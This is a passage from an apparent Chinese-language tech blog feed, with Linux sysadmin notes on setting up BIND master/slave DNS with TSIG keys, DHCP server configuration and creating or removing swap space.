class="line">    allow-query     { any; };</span><br><span class="line">    </span><br><span class="line">    recursion yes;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    dnssec-validation no;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">zone &quot;abc.cn&quot; IN {</span><br><span class="line">    type slave;</span><br><span class="line">    file &quot;slaves/abc.cn.zone.file&quot;;</span><br><span class="line">    masters { 192.168.73.5; };</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">zone &quot;73.168.192.in-addr.arpa&quot; IN {</span><br><span class="line">    type slave;</span><br><span class="line">    file &quot;slaves/192.168.73.arpa.file&quot;;</span><br><span class="line">    masters { 192.168.73.5; };</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><blockquote><p>&#x91CD;&#x542F;&#x4ECE;DNS&#x670D;&#x52A1;&#x5668;&#xFF0C;<br>&#x67E5;&#x770B;/var/named/slaves/&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br>&#x4ECE;DNS&#x670D;&#x52A1;&#x80FD;&#x591F;&#x4ECE;&#x4E3B;DNS&#x590D;&#x5236;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8FC7;&#x6765;</p></blockquote><h3 id="DNS&#x4E3B;&#x4ECE;&#x5BC6;&#x94A5;&#x8BA4;&#x8BC1;"><a href="#DNS&#x4E3B;&#x4ECE;&#x5BC6;&#x94A5;&#x8BA4;&#x8BC1;" class="headerlink" title="DNS&#x4E3B;&#x4ECE;&#x5BC6;&#x94A5;&#x8BA4;&#x8BC1;"></a>DNS&#x4E3B;&#x4ECE;&#x5BC6;&#x94A5;&#x8BA4;&#x8BC1;</h3><blockquote><p>ntpd&#x4E3B;&#x4ECE;&#x65F6;&#x95F4;&#x540C;&#x6B65;</p></blockquote><p><strong>&#x4E3B;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x751F;&#x6210;&#x5BC6;&#x94A5;</span></span><br><span class="line"><span class="built_in">cd</span> /var/named/chroot/etc/</span><br><span class="line">dnssec-keygen -a hmac-md5 -b 128 -n HOST &#x5BC6;&#x94A5;&#x540D;&#x79F0;</span><br><span class="line"><span class="comment"># &#x67E5;&#x770B;&#x5BC6;&#x94A5;&#x7684;&#x5BC6;&#x7801;</span></span><br><span class="line">cat k****.+**+***.key</span><br><span class="line">cat Kdnskey.+157+23495.key</span><br><span class="line">dnskey. IN KEY 512 3 157 Rg0mKvMMQ06YAoN0FcOCXQ==</span><br><span class="line">&#x590D;&#x5236;&#x5BC6;&#x7801;&#x4E32;</span><br><span class="line"><span class="comment">########################################</span></span><br><span class="line"><span class="comment"># &#x4FEE;&#x6539;&#x4E3B;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</span></span><br><span class="line">vim /etc/named.conf</span><br><span class="line"><span class="comment"># &#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x914D;&#x7F6E;</span></span><br><span class="line">key <span class="string">&quot;dnskey&quot;</span> {</span><br><span class="line">    algorithm hmac-md5;</span><br><span class="line">    secret <span class="string">&quot;&#x7C98;&#x8D34;&#x751F;&#x6210;&#x7684;key&#x5BC6;&#x7801;&#x4E32;&quot;</span>;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">zone <span class="string">&quot;abc.cn&quot;</span> IN {</span><br><span class="line">    <span class="built_in">type</span> master;</span><br><span class="line">    file <span class="string">&quot;abc.cn.zone&quot;</span>;</span><br><span class="line">    allow-transfer { key &#x5BC6;&#x94A5;&#x540D;&#x79F0; };</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">zone <span class="string">&quot;73.168.192.in-addr.arpa&quot;</span> IN {</span><br><span class="line">    <span class="built_in">type</span> master;</span><br><span class="line">    file <span class="string">&quot;192.168.73.apra&quot;</span>;</span><br><span class="line">    allow-transfer { key &#x5BC6;&#x94A5;&#x540D;&#x79F0; };</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x4ECE;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x4FEE;&#x6539;dns&#x914D;&#x7F6E;&#x6587;&#x4EF6;</span></span><br><span class="line">vim /etc/named.conf</span><br><span class="line"><span class="comment"># &#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x914D;&#x7F6E;</span></span><br><span class="line">key <span class="string">&quot;dnskey&quot;</span> {</span><br><span class="line">    algorithm hmac-md5;</span><br><span class="line">    secret <span class="string">&quot;&#x7C98;&#x8D34;&#x751F;&#x6210;&#x7684;&#x5BC6;&#x94A5;&#x5230;&#x8BE5;&#x5904;&quot;</span>;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">zone <span class="string">&quot;abc.cn&quot;</span> IN {</span><br><span class="line">    <span class="built_in">type</span> slave;</span><br><span class="line">    file <span class="string">&quot;slaves/abc.cn.zone.file&quot;</span>;</span><br><span class="line">    masters { 192.168.73.5 key dnskey; };</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">zone <span class="string">&quot;73.168.192.in-addr.arpa&quot;</span> IN {</span><br><span class="line">    <span class="built_in">type</span> slave;</span><br><span class="line">    file <span class="string">&quot;slaves/192.168.73.arpa.file&quot;</span>;</span><br><span class="line">    masters { 192.168.73.5 key dnskey; };</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x5E38;&#x89C1;&#x95EE;&#x9898;&#x89E3;&#x51B3;"><a href="#&#x5E38;&#x89C1;&#x95EE;&#x9898;&#x89E3;&#x51B3;" class="headerlink" title="&#x5E38;&#x89C1;&#x95EE;&#x9898;&#x89E3;&#x51B3;"></a>&#x5E38;&#x89C1;&#x95EE;&#x9898;&#x89E3;&#x51B3;</h2><p><strong>&#x542F;&#x52A8;&#x72B6;&#x6001;&#x62A5;network unreachable&#x95EE;&#x9898;</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;./DNSKEY/IN&apos;: 2001:503:ba3e::2:30#53</span><br><span class="line">Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;./NS/IN&apos;: 2001:503:ba3e::2:30#53</span><br><span class="line">Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;dlv.isc.org/DNSKEY/IN&apos;: 2001:500:48::1#53</span><br><span class="line">Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;dlv.isc.org/DNSKEY/IN&apos;: 2001:4f8:0:2::19#53</span><br><span class="line">Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/A/IN&apos;: 2001:500:2f::f#53</span><br><span class="line">Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/AAAA/IN&apos;: 2001:500:2f::f#53</span><br><span class="line">Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/A/IN&apos;: 2001:500:1::803f:235#53</span><br><span class="line">Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/AAAA/IN&apos;: 2001:500:1::803f:235#53</span><br><span class="line">Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/A/IN&apos;: 2001:503:c27::2:30#53</span><br><span class="line">Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/AAAA/IN&apos;: 2001:503:c27::2:30#53</span><br><span class="line">Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/A/IN&apos;: 2001:500:1a::1#53</span><br><span class="line">Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;dlv.isc.org/DNSKEY/IN&apos;: 2001:4f8:0:2::20#53</span><br><span class="line">Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;dlv.isc.org/DNSKEY/IN&apos;: 2001:500:60::29#53</span><br><span class="line">Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns1.isc.ultradns.net/A/IN&apos;: 2001:7fd::1#53</span><br></pre></td></tr></tbody></table></figure><p></p><blockquote><p>&#x914D;&#x7F6E;&#x9012;&#x5F52;&#x65F6;&#xFF0C;&#x8F6C;&#x53D1;&#x6570;&#x636E;&#x4F18;&#x5148;IPv6&#x8FED;&#x4EE3;</p></blockquote><p>&#x4FEE;&#x6539;<code>/etc/sysconfig/named</code><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># &#x6DFB;&#x52A0;OPTIONS</span><br><span class="line">#/etc/sysconfig/named &#x662F;bind&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x542F;&#x52A8;&#x65F6;&#x4F20;&#x9012;&#x53C2;&#x6570;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;</span><br><span class="line"></span><br><span class="line">OPTIONS=&quot;-4&quot;</span><br><span class="line"># BIND named process options</span><br><span class="line"># ~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53C2;&#x8003;&#xFF1A;<a href="https://www.cnblogs.com/zy09/p/14596993.html" target="_blank" rel="noopener">https://www.cnblogs.com/zy09/p/14596993.html</a></p><p><strong>&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;DNS&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x65E0;&#x6CD5;&#x8BFB;&#x53D6;&#x4ECE;DNS&#x914D;&#x7F6E;</strong></p><blockquote><p>&#x4FEE;&#x6539;&#x4ECE;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/named.conf</span><br><span class="line">dnssec-enable yes;  </span><br><span class="line">dnssec-validation no;   <span class="comment">#&#x5173;&#x95ED;&#x9A8C;&#x8BC1;</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><h2 id="DNS&#x914D;&#x7F6E;&#x89E3;&#x6790;"><a href="#DNS&#x914D;&#x7F6E;&#x89E3;&#x6790;" class="headerlink" title="DNS&#x914D;&#x7F6E;&#x89E3;&#x6790;"></a>DNS&#x914D;&#x7F6E;&#x89E3;&#x6790;</h2><blockquote><p>An example of a simple resource record (RR):<br>example.com.    86400    IN    A    192.0.2.1</p></blockquote><p>example.com, &#x8D44;&#x6E90;&#x8BB0;&#x5F55;<br>86400,  time to live(TTL)<br>IN  &#x201C;the Internet system&#x201D;, &#x6307;&#x660E;RR&#x7684;&#x7684;&#x7C7B;&#x522B;<br>A   &#x6307;&#x660E;RR&#x7684;&#x7C7B;&#x578B;&#xFF0C;a host address<br>192.0.2.1   &#x6307;&#x660E;RR&#x5305;&#x542B;&#x7684;IP&#x5730;&#x5740;</p><blockquote><p>/etc/named.conf&#xFF0C;bind&#x7684;&#x4E3B;&#x8981;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br>/var/named/&#xFF0C;&#x4E3B;&#x8981;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x8F85;&#x52A9;&#x76EE;&#x5F55;</p></blockquote><p>SOA &#xFF0C;Start of Authority Record&#xFF0C;&#x8D77;&#x59CB;&#x6388;&#x6743;&#x8BB0;&#x5F55;&#xFF0C;&#x6BCF;&#x4E2A;&#x533A;&#x5728;&#x533A;&#x7684;&#x5F00;&#x59CB;&#x90FD;&#x5305;&#x542B;&#x4E00;&#x4E2A;<br>NS&#xFF0C;Name Server&#xFF0C;&#x57DF;&#x540D;&#x670D;&#x52A1;&#x5668;&#x8BB0;&#x5F55;&#xFF0C;&#x7528;&#x6765;&#x6307;&#x5B9A;&#x8BE5;&#x57DF;&#x540D;&#x7531;&#x54EA;&#x4E2A;DNS&#x670D;&#x52A1;&#x5668;&#x6765;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#xFF0C;&#x6BCF;&#x4E2A;&#x533A;&#x81F3;&#x5C11;&#x5305;&#x542B;&#x4E00;&#x4E2A;NS<br>A&#xFF0C;&#x5730;&#x5740;&#x8D44;&#x6E90;&#x8BB0;&#x5F55;&#xFF0C;&#x628A;FQDN&#xFF08;&#x5B8C;&#x5168;&#x5408;&#x683C;&#x57DF;&#x540D;&#xFF0C;&#x6216;&#x5B8C;&#x6574;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#x540D;&#xFF09;&#x6620;&#x5C04;&#x5230;IP&#x5730;&#x5740;&#xFF0C;&#x8BE5;&#x8BB0;&#x5F55;&#x80FD;&#x591F;&#x89E3;&#x6790;FQDN&#x57DF;&#x540D;&#x5BF9;&#x5E94;&#x7684;IP&#x5730;&#x5740;&#x3002;<br>PTR&#xFF0C;&#x6307;&#x9488;&#x8BB0;&#x5F55;&#xFF0C;&#x628A;IP&#x5730;&#x5740;&#x6620;&#x5C04;&#x5230;FQDN&#xFF0C;&#x7528;&#x4E8E;&#x53CD;&#x5411;&#x67E5;&#x8BE2;&#xFF0C;&#x901A;&#x8FC7;IP&#x5730;&#x5740;&#x627E;&#x5230;&#x57DF;&#x540D;&#x3002;<br>CNAME&#xFF0C;&#x522B;&#x540D;&#x8BB0;&#x5F55;&#xFF0C;&#x521B;&#x5EFA;&#x7279;&#x5B9A;&#x7684;FQDN&#x522B;&#x540D;<br>MX&#xFF0C;&#x90AE;&#x4EF6;&#x4EA4;&#x6362;&#x8BB0;&#x5F55;&#xFF0C;&#x6307;&#x5B9A;&#x90AE;&#x4EF6;&#x4EA4;&#x6362;&#x670D;&#x52A1;&#x5668;&#x3002;</p><p><strong>/etc/named.conf&#x5E38;&#x7528;&#x914D;&#x7F6E;&#x9009;&#x9879;</strong></p><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td>allow-query</td><td></td></tr><tr><td>allow-query-cache</td><td></td></tr><tr><td>blackhole</td><td></td></tr><tr><td>directory</td><td></td></tr><tr><td>disable-empty-zone</td><td></td></tr><tr><td>dnssec-enable</td><td></td></tr><tr><td>dnssec-validation</td><td></td></tr><tr><td>empty-zones-enable</td><td></td></tr><tr><td>forwarders</td><td></td></tr><tr><td>forward</td><td></td></tr><tr><td>listen-on</td><td></td></tr><tr><td>listen-on-v6</td><td></td></tr><tr><td>max-cache-size</td><td></td></tr><tr><td>notify</td><td></td></tr><tr><td>pid-file</td><td></td></tr><tr><td>recursion</td><td></td></tr><tr><td>statistics-file</td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x914D;&amp;#x7F6E;&amp;#x5B9E;&amp;#x73B0;&quot;&gt;&lt;a href=&quot;#&amp;#x914D;&amp;#x7F6E;&amp;#x5B9E;&amp;#x73B0;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x914D;&amp;#x7F6E;&amp;#x5B9E;&amp;#x7
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>DHCP Server的配置与管理</title>
    <link href="https://marnm.github.io//posts/9964b559/"/>
    <id>https://marnm.github.io//posts/9964b559/</id>
    <published>2022-06-07T04:34:55.000Z</published>
    <updated>2022-06-07T05:25:31.173Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x5B89;&#x88C5;&#x914D;&#x7F6E;"><a href="#&#x5B89;&#x88C5;&#x914D;&#x7F6E;" class="headerlink" title="&#x5B89;&#x88C5;&#x914D;&#x7F6E;"></a>&#x5B89;&#x88C5;&#x914D;&#x7F6E;</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rhel/centos</span></span><br><span class="line">yum install -y dhcp</span><br></pre></td></tr></tbody></table></figure><blockquote><p><code>/etc/dhcp/dhcpd.conf</code>DHCP&#x4E3B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x76EE;&#x5F55;<br><code>/usr/share/doc/dhcp*/dhcpd.conf.sample</code>DHCP&#x914D;&#x7F6E;&#x6A21;&#x677F;<br><code>/var/lib/dhcpd/dhcpd.leases</code> dhcp&#x79DF;&#x7EA6;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x4FDD;&#x5B58;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x79DF;&#x7EA6;&#x58F0;&#x660E;&#xFF0C;&#x5305;&#x542B;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x4E3B;&#x673A;&#x540D;&#x3001;MAC&#x5730;&#x5740;&#x3001;&#x5206;&#x914D;&#x7684;IP&#x5730;&#x5740;&#x7B49;&#x3002;</p></blockquote><h3 id="&#x914D;&#x7F6E;&#x793A;&#x4F8B;"><a href="#&#x914D;&#x7F6E;&#x793A;&#x4F8B;" class="headerlink" title="&#x914D;&#x7F6E;&#x793A;&#x4F8B;"></a>&#x914D;&#x7F6E;&#x793A;&#x4F8B;</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/dhcp/dhcpd.conf</span><br><span class="line"><span class="comment">########################</span></span><br><span class="line"><span class="comment"># &#x58F0;&#x660E;&#x4E00;&#x4E2A;&#x6BB5;&#xFF1A;</span></span><br><span class="line">subnet 192.168.1.0 netmask 255.255.255.0 {</span><br><span class="line">  <span class="comment"># &#x5730;&#x5740;&#x6C60;IP&#x5730;&#x5740;&#x8303;&#x56F4;</span></span><br><span class="line">  range 192.168.1.10 192.168.1.50;</span><br><span class="line">  <span class="comment"># &#x5BA2;&#x6237;&#x7AEF;&#x6307;&#x5B9A;DNS&#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;&#xFF1A;</span></span><br><span class="line">  <span class="comment">#option domain-name-servers ns1.internal.example.org; </span></span><br><span class="line">  <span class="comment"># &#x4E3A;&#x5BA2;&#x6237;&#x7AEF;&#x6307;&#x5B9A;&#x6240;&#x5C5E;&#x7684;&#x57DF;&#xFF1A;</span></span><br><span class="line">  <span class="comment">#option domain-name &quot;internal.example.org&quot;;</span></span><br><span class="line">  <span class="comment"># &#x9ED8;&#x8BA4;&#x7F51;&#x5173;/&#x8DEF;&#x7531;</span></span><br><span class="line">  option routers 192.168.1.1;</span><br><span class="line">  <span class="comment"># &#x5E7F;&#x64AD;&#x5730;&#x5740;</span></span><br><span class="line">  option broadcast-address 192.168.1.255;</span><br><span class="line">  <span class="comment"># &#x5B9A;&#x4E49;IP&#x9ED8;&#x8BA4;&#x79DF;&#x7EA6;&#x65F6;&#x95F4;&#xFF0C;&#xFF08;&#x5355;&#x4F4D;&#xFF1A;s/&#x79D2;&#xFF09;&#xFF1A;</span></span><br><span class="line">  default-lease-time 600;  </span><br><span class="line">  <span class="comment"># &#x5B9A;&#x4E49;IP&#x6700;&#x5927;&#x79DF;&#x7EA6;&#x65F6;&#x957F;&#xFF0C;&#xFF08;&#x5355;&#x4F4D;&#xFF1A;s/&#x79D2;&#xFF09;&#xFF1A;</span></span><br><span class="line">  max-lease-time 7200;</span><br><span class="line">  <span class="comment"># &#x5B9A;&#x4E49;&#x65E5;&#x5FD7;&#x7C7B;&#x578B;</span></span><br><span class="line">  <span class="built_in">log</span>-facility local7;</span><br><span class="line">  <span class="comment"># IP&#x5730;&#x5740;&#x7ED1;&#x5B9A;&#xFF1A;</span></span><br><span class="line">  <span class="comment"># &#x6307;&#x5B9A;&#x4E00;&#x4E2A;IP&#x5730;&#x5740;&#x7ED9;&#x6307;&#x5B9A;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x6307;&#x5B9A;&#x7684;&#x5730;&#x5740;&#x4E0D;&#x53EF;&#x4EE5;&#x4E0D;&#x5728;&#x5730;&#x5740;&#x6C60;&#x8303;&#x56F4;&#x5185;</span></span><br><span class="line">  host localhost {</span><br><span class="line">    <span class="comment"># &#x5BA2;&#x6237;&#x7AEF;&#x7684;MAC&#x5730;&#x5740;</span></span><br><span class="line">    hardware ethernet 00:0c:29:10:d9:56;</span><br><span class="line">    <span class="comment"># &#x6307;&#x5B9A;&#x7684;IP&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;</span></span><br><span class="line">    fixed-address 192.168.1.11;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x5B89;&amp;#x88C5;&amp;#x914D;&amp;#x7F6E;&quot;&gt;&lt;a href=&quot;#&amp;#x5B89;&amp;#x88C5;&amp;#x914D;&amp;#x7F6E;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x5B89;&amp;#x88C5;&amp;#x914D;&amp;#x7
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>根分区扩容</title>
    <link href="https://marnm.github.io//posts/f0a65eeb/"/>
    <id>https://marnm.github.io//posts/f0a65eeb/</id>
    <published>2022-06-07T04:33:22.000Z</published>
    <updated>2022-06-07T04:56:53.702Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>swap交换分区</title>
    <link href="https://marnm.github.io//posts/37ca92de/"/>
    <id>https://marnm.github.io//posts/37ca92de/</id>
    <published>2022-06-07T04:32:42.000Z</published>
    <updated>2022-06-07T05:25:46.405Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x6269;&#x5C55;&#x4EA4;&#x6362;&#x5206;&#x533A;"><a href="#&#x6269;&#x5C55;&#x4EA4;&#x6362;&#x5206;&#x533A;" class="headerlink" title="&#x6269;&#x5C55;&#x4EA4;&#x6362;&#x5206;&#x533A;"></a>&#x6269;&#x5C55;&#x4EA4;&#x6362;&#x5206;&#x533A;</h3><p><strong>&#x65B9;&#x6CD5;&#x4E00;&#xFF1A;&#x521B;&#x5EFA;&#x4EA4;&#x6362;&#x5206;&#x533A;</strong></p><blockquote><p>&#x4F7F;&#x7528;fdisk/gdisk&#x7B49;&#x5206;&#x533A;&#x5DE5;&#x5177;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;<br>&#x4F7F;&#x7528;mkswap&#x521B;&#x5EFA;&#x4EA4;&#x6362;&#x5206;&#x533A;</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fdisk /dev/sdb</span><br><span class="line">n</span><br><span class="line">...</span><br><span class="line">+1G</span><br><span class="line">...</span><br><span class="line">w</span><br><span class="line"><span class="comment"># &#x8BBE;&#x7F6E;&#x4EA4;&#x6362;&#x5206;&#x533A;</span></span><br><span class="line">mkswap /dev/sdb1</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x542F;&#x7528;&#x4EA4;&#x6362;&#x5206;&#x533A;</span></span><br><span class="line">swapon /dev/sdb1</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5F00;&#x673A;&#x6302;&#x8F7D;</span></span><br><span class="line">vim /etc/fstab</span><br><span class="line"><span class="comment">#&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x53C2;&#x6570;</span></span><br><span class="line">/dev/sdb1   swap swap   defaults 0 0</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x65B9;&#x6CD5;&#x4E8C;&#xFF1A;&#x521B;&#x5EFA;&#x4EA4;&#x6362;&#x6587;&#x4EF6;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;512MB&#x5927;&#x5C0F;&#x7684;&#x6587;&#x4EF6;&#x4E3A;&#x4F8B;&#xFF1A;</span></span><br><span class="line">dd <span class="keyword">if</span>=/dev/zero of=/swapfile bs=1024 count=524288</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x521B;&#x5EFA;swap&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br><span class="line">mkswap /swapfile</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x542F;&#x7528;&#x4EA4;&#x6362;&#x5206;&#x533A;</span></span><br><span class="line">swapon /swapfile</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5F00;&#x673A;&#x6302;&#x8F7D;</span></span><br><span class="line">vim /etc/fstab</span><br><span class="line">/swapfile   swap    swap    defaults 0 0</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x5220;&#x9664;&#x4EA4;&#x6362;&#x7A7A;&#x95F4;"><a href="#&#x5220;&#x9664;&#x4EA4;&#x6362;&#x7A7A;&#x95F4;" class="headerlink" title="&#x5220;&#x9664;&#x4EA4;&#x6362;&#x7A7A;&#x95F4;"></a>&#x5220;&#x9664;&#x4EA4;&#x6362;&#x7A7A;&#x95F4;</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x7981;&#x7528;&#x4EA4;&#x6362;&#x5206;&#x533A;/&#x4EA4;&#x6362;&#x6587;&#x4EF6;</span></span><br><span class="line">swapoff /dev/sdb1</span><br><span class="line"><span class="comment">#swapoff 